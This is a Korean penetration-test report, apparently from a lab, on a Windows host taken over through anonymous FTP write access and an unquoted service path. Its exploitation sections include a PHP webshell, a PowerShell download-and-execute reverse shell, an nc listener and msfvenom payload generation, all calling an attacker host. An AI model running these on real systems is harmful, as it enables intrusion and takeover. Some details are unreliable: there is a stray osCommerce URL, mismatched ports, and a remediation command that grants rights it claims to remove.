
## 목차

1. 개요
    1. 총평
    2. 진단 결과 요약

2. 모의해킹 수행 내용
    1. 정보 수집
    2. 취약점 진단
    3. 취약점 공격 및 호스트 초기 침투
    4. 권한 상승

3. 취약점 및 대응 방안
    1. Anonymous FTP 비활성화
    2. 불필요한 서비스 제거
    3. 사용자의 서비스 재실행 권한
    4. ftpusers 파일 소유자 및 권한 설정


## 개요

### 총평

| **분석 기간**                   | **호스트 이름** | **IP주소**  | **목적**            |
| --------------------------- | ---------- | --------- | ----------------- |
| 2024년 7월 27일 ~ 2024년 7월 28일 | Host1      | 10.0.4.20 | 보안 취약점 진단 및 침투테스트 |

본 보고서는 2024년 7월 27일부터 28일까지 진행된 Host1 호스트에 대한 모의해킹 작업을 요약한다. 이 과정에서 발견된 취약점과 그에 따른 침투 테스트 결과를 중점적으로 다룬다.

FTP서버에 익명 로그인을 허용하거나 모든 유저에게 파일 권한을 주는 등 FTP 서버에 대한 접근 검증이 미흡한 상태이다. 공격자는 FTP에 익명으로 접속이 가능하며 쓰기 권한을 가지고 있기 때문에 파일 업로드 기능을 이용해 기존 파일 수정 및 악성 PHP 파일(웹쉘)을 업로드 할 수 있다. 또한 웹 서버와 FTP 서버는 서로의 디렉토리를 공유하고 있기 때문에 이를 이용하면 해당 웹쉘을 실행시킬 수 있다.

웹쉘을 통해 리버스쉘까지 얻은 공격자는 내부 파일시스템을 탐색할 수 있으며, 내부 시스템 취약점 및 네트워크를 탐색할 가능성이 있다. 서비스 실행 파일 경로에 공백이 존재하며, 쌍따옴표를 붙이지 않은 상태로 실행중인 서비스가 존재한다. 이러한 경우에 경로 탐색 함수 자체의 구조적인 취약점으로 인해, 공격자가 해당 취약점을 이용해 악성 파일을 실행시킬 위험이 존재한다.

또한 관리자가 아닌 낮은 유저에게 불필요한 권한을 준 상태이므로, 서비스를 임의로 재실행할 수 있었다. 이렇게 SYSTEM 권한을 이용해 서비스를 재실행시킨다면 권한 상승까지 하여 호스트가 장악당할 위험이 존재한다.

인터넷에 노출되어 있는 호스트의 특성상 점검자는 취약점을 발견한 즉시 RedRaccoon사의 보안 담당자에게 연락해 취약점 정보를 제공했다.

### 진단 결과 요약

아래 표는 이번 모의해킹 과정에서 발견된 주요 취약점을 요약한 것이다. 각 취약점에 대한 자세한 설명 및 대응 방안은 본 보고서의 '취약점 및 대응 방안' 섹션에서 확인할 수 있다.

| 번호  | 이름                          | 중요도 | 설명                                                                          | 대응 방안                                                              |
| --- | --------------------------- | --- | --------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| 1   | Anonymous FTP 비활성화          | 상   | FTP 서버 익명 로그인을 허용하도록 설정하고 있어 계정 정보 없이 접속 및 중요정보 수집 가능                       | FTP 서버 익명 로그인 허용 금지                                                |
| 2   | 불필요한 서비스 제거<br><br>         | 상   | 서비스 실행 경로에 쌍따옴표("")가 없고 공백이 있을 경우 공격자가 서비스 중간 경로에서 임의의 악성 바이너리를 업로드 및 실행 가능 | Unquoted Service Path에 해당하는 서비스 경로에 쌍따옴표("")추가하여 악성 행위를 하지 못하도록 대응 |
| 3   | 사용자의 서비스 재실행 권한<br>         | 상   | 서비스 재실행하여 SYSTEM 권한 획득 가능                                                   | 임의의 낮은 권한의 유저에 대해 서비스 재실행 권한 제거                                    |
| 4   | ftpusers 파일 소유자 및 권한 설정<br> | 중   | 낮은권한 사용자의 쓰기 권한으로 FTP 파일 수정 및 악성 파일 업로드 가능                                  | FTP 접근제어 파일의 소유자 및 권한 변경                                           |



## 모의해킹 수행 내용

### 정보 수집 - 포트스캐닝

대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.

```
# nmap -p- --max-retries 1 -sS -Pn -n -oA overallscan -T5 10.0.4.20                                                                    
Nmap scan report for 10.0.4.20
Host is up (0.00033s latency).
Not shown: 65525 filtered tcp ports (no-response)                                             
PORT      STATE SERVICE                        
21/tcp    open  ftp               
80/tcp    open  http            
5985/tcp  open  wsman        
19150/tcp open  gkrellm
49664/tcp open  unknown
49665/tcp open  unknown            
49667/tcp open  unknown                        
49668/tcp open  unknown
49669/tcp open  unknown
49679/tcp open  unknown                 
```


해당 열린 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.

```
# nmap -p 21,80,5985,19150,49664,49665,49667,49668,49669,49679 -sV -sC -Pn -n -oA detailed 10.0.4.20

PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open     http    Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Welcome to Our Website
5985/tcp  open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
19150/tcp filtered gkrellm
49664/tcp open     msrpc   Microsoft Windows RPC
49665/tcp open     msrpc   Microsoft Windows RPC
49667/tcp open     msrpc   Microsoft Windows RPC
49668/tcp open     msrpc   Microsoft Windows RPC
49669/tcp open     msrpc   Microsoft Windows RPC
49679/tcp open     msrpc   Microsoft Windows RPC
MAC Address: 0A:FF:87:FB:35:FD (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

포트 스캔 결과, 크게 포트 21에서는 Filezilla FTP가, 포트 80에서는 아파치 웹서버가 실행중이였으며, 포트 5985에서는 WinRM 서버가 실행중이였다. 그 이외의 열린 포트는 모두 RPC 관련 포트이다. FTP 서버의 경우, 익명 로그인이 허용 중이므로 직접 접속하여 자세한 정보 수집을 진행했다. 

### 정보 수집 - FTP


기초적인 웹 정보 수집을 위해 포트 8080을 방문하니 `Under Construction`이라는 문구와 함께 기초적인 랜딩 페이지가 나왔다.

FTP서버에 익명 로그인으로 직접 접근해봤을 때, index.php, upload.php가 있음을 확인한다. 
![](Pasted%20image%2020240728002947.png)

서버의 소스코드가 나옴을 알 수 있지만, 어느 경로인지 확인되지 않았으므로 자세한 정보수집을 위해 웹서버에 접속한다.
![](Pasted%20image%2020240728003400.png)

### 취약점 진단

`gobuster` 툴을 사용해 디렉토리 브루트포싱을 진행 시, /staging/ 경로를 찾아냈으며, 실제로 파일을 업로드 할 수 있는 페이지가 있음을 확인한다.
```
gobuster dir -u http://10.0.4.20/ -w /usr/share/dirb/wordlists/common.txt -t 20 -o simple -f

/dashboard/           (Status: 200) [Size: 5187]
/index.php/           (Status: 200) [Size: 2727]
/img/                 (Status: 200) [Size: 1212]
/icons/               (Status: 200) [Size: 74798]
/staging/             (Status: 200) [Size: 2877]
```

![](Pasted%20image%2020240728005627.png)

실제로 파일 업로드가 가능함을 확인한다. php 확장자 파일 업로드 우회를 시도해보았으나, 불가능한 것은 물론 파일 업로드 후, 정확한 업로드 파일 경로를 알 수가 없는 상태다.
![](Pasted%20image%2020240728003947.png)

하지만 해당 파일의 업로드 여부와 상관없이, FTP서버의 디렉토리가 웹서버 /staging/ 디렉토리와 공유중이기 때문에, 해당 php 파일의 소스코드를 확인이 가능하며, 악성 파일 업로드까지 가능하다. 
![](Pasted%20image%2020240728005202.png)


### 취약점 공격 및 호스트 초기 침투


따라서 FTP서버의 파일 업로드 권한을 이용하여 임의의 악성파일인 php 웹쉘 파일을 업로드하여 실행할 수 있다. 

```php
# Webshell.php 코드
<?php system($_POST['cmd']) ?>
```

업로드가 된 파일 경로로 직접 접속하여 `cmd` 파라미터 값에 시스템 명령어를 입력하여  응답값을 받는다. POST 메소드를 이용하여 요청하기 위해 웹 프록시를 이용한다.

![](Pasted%20image%2020240728005534.png)



정상적으로 명령어가 작동하며, 공격자 서버로 Fully Interactive 리버스 쉘을 얻기 위해 
`Invoke-ConPtyShell.ps1` 파워쉘 스크립트를 이용한다. 이 때, 공격자 호스트에서는 스크립트를 다운받고 웹서비스를 구동 및 1234 포트를 열어둔다. 아래와 같은 명령어를 요청한다.  

```
# ATTACKER
stty raw -echo; (stty size; cat) | nc -lvnp 1234

# TARGET 
powershell IEX(IWR http://10.0.4.25/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.4.25 1234
```

웹 서비스 계정인 xampp 유저로 들어올 수 있다.
![](Pasted%20image%2020240728083650.png)


### 권한 상승

Unquoted Service Path 취약점의 존재 여부를 확인하기 위해 실행되고 있는 서비스들 중에, 서비스 실행 파일 경로에 쌍따옴표("") 가 없고, 공백이 있는 서비스들을 검색한다.

```powershell
Get-WmiObject Win32_Service | Where-object {$_.Startmode -eq 'Auto' -and $_.pathname -notlike 'c:\windows\*' -and $_.PathName -notmatch '^\s*\".*$'} | select-object Name, DisplayName, PathName, StartMode
```


서비스 실행 경로 : `C:\utils\Remote System Monitor Server\RemoteSystemMonitorService.exe`

서비스를 실행 시킬 때, 윈도우 API 함수의 특성상, 서비스 실행 경로 중간(`C:\utils\Remote System Monitor Server\`)에 공백이 있다면. Remote.exe 와 같이 .exe 를 붙여 실행하기 때문에 이러한 탐색 방식을 악용하여 Remote.exe 라는 이름의 악성 파일 업로드를 시도한다.

이를 구현하기 위해 `icacls`로 해당 경로`c:\utils`에 유저의 쓰기권한이 있는지 확인한다.  
![](Pasted%20image%2020240728012607.png)

공격자 호스트에서 리버스쉘을 제작한 후, 대상 호스트의 `c:\utils\Remote.exe` 경로로 전송한다.
```
# ATTACKER
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=4466 -f exe-service -o Remote.exe

# TARGET
wget http://10.0.4.25/Remote.exe -OutFile c:\utils\Remote.exe
```


공격자 호스트에서 4466 포트를 열어두고, 서비스를 재실행하여 악성 바이너리 파일 Remote.exe 를 실행시킨다.
`Restart-Service RemoteSystemMonitorService`


SYSTEM 권한을 통해 서비스를 재실행시키므로, SYSTEM 유저로 리버스 쉘을 연결받은 것을 확인한다.
![](Pasted%20image%2020240727130103.png)

SYSTEM 권한으로 설정된 쉘을 획득했다. 이 권한 상승을 통해 Host1 의 제어권을 확보했고, 모의 침투 테스트는 여기서 마무리됐다. 테스트 과정에서 발견된 취약점들은 다음 섹션에 문서화했다.


## 취약점 및 대응 방안
### 1. Anonymous FTP 비활성화

#### 취약점 개요

| 정보          | 설명                                                                                                                                                                                        |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 이름          | Anonymous FTP 비활성화                                                                                                                                                                        |
| 중요도         | 상                                                                                                                                                                                         |
| CVSS        | 6.4                                                                                                                                                                                       |
| CVSS String | AV:N/AC:L/Au:N/C:P/I:P/A:N                                                                                                                                                                |
| 위치          | URL: http://172.31.204.235:8080/catalog/install/install.php?step=4  <br>POST 요청 파라미터: `DB_DATABASE`  <br>파일 경로: `/var/www/osCommerce-2.3.4/catalog/install/templates/pages/install_4.php` |

#### 취약점 설명

FTP서버는 FileZilla 0.9.41 버전을 사용 중이며, 버전에 상관없이 관리자가 초기 서버 설정 시, 잘못된 설정으로 FTP 익명 로그인을 허용하고 있는 상태이다. 공격자는 FTP 클라이언트를 통해 `ftp 10.0.4.20` 으로 접속하여 `anonymous` 익명 계정으로 비밀번호 없이 로그인할 수 있다. 읽기/쓰기 권한이 부여되어 있으므로 어떤 파일이 공유되어 있는지 파일 확인 및 수정이 가능하며 악성 파일을 업로드할 수 있다.


#### 대응 방안

위와 같은 민감한 파일을 공유하려고 한다면, FTP 서버를 익명 로그인 허용 해제로 설정한다. 또한 해당 서비스는 외부에 오픈된 서비스이기 때문에, 관리자 권한이 필요한 중요한파일은 되도록이면 FTP서버를 로컬호스트에서 구동하여 공유할 것을 권장한다.

```xml
# 경로 : `C:\xampp\FileZillaFTP\FileZilla Server.xml`

<FileZillaServer> 
    <Settings>
        <Item name="Admin port" type="numeric">14147</Item>
        <Item name="Service display name" type="string">FileZillaServer</Item>
        <Item name="Service name" type="string">FileZillaServer</Item>
        <Item name="PassivePortRange" type="string">48000-51000</Item>
    </Settings>
    <Groups />
    <Users>
        <User Name="anonymous">
            <Option Name="Pass"> </Option>
            <Option Name="Group"></Option>
            <Option Name="Bypass server userlimit">0</Option>
            <Option Name="User Limit">0</Option>
            <Option Name="IP Limit">0</Option>
            <Option Name="Enabled">1</Option>
            <Option Name="Comments"></Option>
            <Option Name="ForceSsl">0</Option>
            <IpFilter>
                <Disallowed />
                <Allowed />
            </IpFilter>
            <Permissions>
                <Permission Dir="C:\xampp\htdocs\staging">
                    <Option Name="FileRead">1</Option>
                    <Option Name="FileWrite">1</Option>
                    <Option Name="FileDelete">1</Option>
                    <Option Name="FileAppend">1</Option>
                    <Option Name="DirCreate">1</Option>
                    <Option Name="DirDelete">1</Option>
                    <Option Name="DirList">1</Option>
                    <Option Name="DirSubdirs">1</Option>
                    <Option Name="IsHome">1</Option>
                    <Option Name="AutoCreate">0</Option>
                </Permission>
            </Permissions>
            <SpeedLimits DlType="0" DlLimit="10" ServerDlLimitBypass="0" UlType="0" UlLimit="10" ServerUlLimitBypass="0">
                <Download />
                <Upload />
            </SpeedLimits>
        </User>
    </Users>
</FileZillaServer>

```

- `anonymous` 익명 로그인 접근 해제 
```xml
<Option Name="Enabled">0</Option>
```


### 2. 불필요한 서비스 제거

#### 취약점 개요

| 정보          | 설명                                  |
| ----------- | ----------------------------------- |
| 이름          | 불필요한 서비스 제거                         |
| 중요도         | 상                                   |
| CVSS        | 7.8                                 |
| CVSS String | AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| 위치          | 서비스 이름: <br>서비스 바이너리 경로:            |

#### 취약점 설명

Unquoted Service Path 취약점을 악용할 수 있다. 서비스를 실행 시킬 때, 윈도우 API 함수의 특성상 서비스 실행 경로 중간(`C:\utils\Remote System Monitor Server\`)에 공백이 존재하고 경로 양끝에 쌍따옴표가("")가 없다면, `Remote.exe` 와 같이 `.exe` 를 붙여 실행한다. 이러한 탐색 방식을 악용하여 `Remote.exe` 라는 이름의 악성 바이너리 파일을 업로드하여 재실행시킬 수 있다.

1. 실행되고 있는 서비스들 중에 서비스 실행 파일 경로 양끝에 쌍따옴표("")가 없고, 공백이 존재하는 서비스를 나열한다.
현재 `RemoteSystemMonitorService` 서비스가 작동중이며 서비스 실행 파일 경로는 `C:\utils\Remote System Monitor Server\RemoteSystemMonitorService.exe` 이므로 쌍따옴표("")가 없고 공백이 있으므로 조건을 충족한다.

2. `icacls` 로 `c:\utils` 경로에 유저의 쓰기권한이 있는지 확인한다.  

3. 공격자 호스트에서 리버스쉘을 제작한 후, 대상 호스트의 `c:\utils\Remote.exe` 경로로 전송한다.

4. 4444 포트 를 공격자 호스트에서 열고, 서비스를 재실행하여 악성 바이너리 파일 Remote.exe 를 실행 시킬 수 있다.
`Restart-Service RemoteSystemMonitorService`

5. SYSTEM 권한을 통해 서비스를 재실행시키므로, SYSTEM 유저로 리버스 쉘을 연결받은 것을 확인한다.


#### 대응 방안

Unquoted Service Path에 해당하는 서비스 경로 양끝에 쌍따옴표("")추가하여 악성 행위를 하지 못하도록 대응한다. 


1. 로컬 관리자 권한으로 레지스트리 에디터를 연다. 
2. `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services` 경로로 이동한다.
3. 해당 서비스 경로로 들어간 후, `ImagePath` 를 더블 클릭하여 경로 시작과 끝에 쌍따옴표를 추가한다. 

수정 이전 경로: `C:\utils\Remote System Monitor Server\RemoteSystemMonitorService.exe`

수정 이후 경로 : `"C:\utils\Remote System Monitor Server\RemoteSystemMonitorService.exe"`


- CLI 환경에서 설정하려면 아래의 명령어를 사용한다.
`reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\RemoteSystemMonitorService" /v ImagePath /t REG_EXPAND_SZ /d "C:\utils\Remote System Monitor Server\RemoteSystemMonitorService.exe" /f`



### 3. 사용자의 서비스 재실행 권한

#### 취약점 개요

| 정보          | 설명                                   |
| ----------- | ------------------------------------ |
| 이름          | 사용자의 서비스 재실행 권한                      |
| 중요도         | 상                                    |
| 위치          | 서비스 이름: `RemoteSystemMonitorService` |

#### 취약점 설명

낮은 권한의 유저인 xampp에게 해당 서비스 RemoteSystemMonitorService에 대해 재실행 권한이 불필요하게 부여되었기 때문에, 공격자는 Unquoted Service Path 취약점을 활용할 수 있었다. 해당 경로에 악성 파일을 업로드 후 재실행 및 정지가 가능하다.
`restart-service RemoteSystemMonitorService` 와 같이 공격자는 재실행 권한을 이용하여 악성 파일(리버스쉘)을 실행해 SYSTEM 계정으로 권한 상승하였다.


#### 대응 방안

누구나 서비스를 재실행할 수 없도록 제한 하기 위해, 기본적으로 낮은 권한의 유저 또는 서비스 계정 유저들에 대해 서비스 재실행 권한을 제거한다.


CLI 환경에서 로컬 관리자는 다음과 같이 설정한다.

```
subinacl /service RemoteSystemMonitorService /GRANT=xampp=S
```

- **S**TOPI = query **s**tatus
- S**T**OPI = s**t**art
- ST**O**PI = st**o**p
- STO**P**I = **p**ause/continue
- STOP**I** = **i**nterrogate.



### 4. ftpusers 파일 소유자 및 권한 설정

#### 취약점 개요

| 정보          | 설명                      |
| ----------- | ----------------------- |
| 이름          | ftpusers 파일 소유자 및 권한 설정 |
| 중요도         | 중                       |



#### 취약점 설명

공격자는 `anonymous` 익명 로그인을 하여 읽기 권한은 물론 쓰기 권한을 이용해 파일을 업로드할 수 있었다. 
anonymous 및 낮은 권한의 사용자들은 불필요하게 쓰기 권한을 가지고 있으며, 이를 이용해 임의로 파일을 수정할 수 있기 때문에 잘못된 권한 설정이라고 볼 수 있다.  
게다가 FTP서버는 웹과 디렉토리를 서로 공유하고 있으므로, 공격자가 웹쉘, 리버스쉘 등의 악성 php 파일을 실행할 위험이 있다.


#### 대응 방안

FTP 서버 접근제어 - 특정 유저에 대해 파일의 권한을 변경한다.

소스코드처럼 민감한 내용의 파일이 들어있을 경우에는, 서버 측에서 익명 사용자 및 낮은 권한 사용자들의 쓰기 권한을 제거한다. 

```xml
# FTP 서버 설정
경로 : `C:\xampp\FileZillaFTP\FileZilla Server.xml`                    

<FileZillaServer> 
    <Settings>
        <Item name="Admin port" type="numeric">14147</Item>
        <Item name="Service display name" type="string">FileZillaServer</Item>
        <Item name="Service name" type="string">FileZillaServer</Item>
        <Item name="PassivePortRange" type="string">48000-51000</Item>
    </Settings>
    <Groups />
    <Users>
        <User Name="anonymous">
            <Option Name="Pass"> </Option>
            <Option Name="Group"></Option>
            <Option Name="Bypass server userlimit">0</Option>
            <Option Name="User Limit">0</Option>
            <Option Name="IP Limit">0</Option>
            <Option Name="Enabled">0</Option>
            <Option Name="Comments"></Option>
            <Option Name="ForceSsl">0</Option>
            <IpFilter>
                <Disallowed />
                <Allowed />
            </IpFilter>
            <Permissions>
                <Permission Dir="C:\xampp\htdocs\staging">
                    <Option Name="FileRead">1</Option>
                    <Option Name="FileWrite">1</Option>
                    <Option Name="FileDelete">1</Option>
                    <Option Name="FileAppend">1</Option>
                    <Option Name="DirCreate">1</Option>
                    <Option Name="DirDelete">1</Option>
                    <Option Name="DirList">1</Option>
                    <Option Name="DirSubdirs">1</Option>
                    <Option Name="IsHome">1</Option>
                    <Option Name="AutoCreate">0</Option>
                </Permission>
            </Permissions>
            <SpeedLimits DlType="0" DlLimit="10" ServerDlLimitBypass="0" UlType="0" UlLimit="10" ServerUlLimitBypass="0">
                <Download />
                <Upload />
            </SpeedLimits>
        </User>
    </Users>
</FileZillaServer>

```

- 유저에 대한 파일 권한 제거
```xml
<Option Name="FileRead">0</Option>
<Option Name="FileWrite">0</Option>
<Option Name="FileDelete">0</Option>
<Option Name="FileAppend">0</Option>
```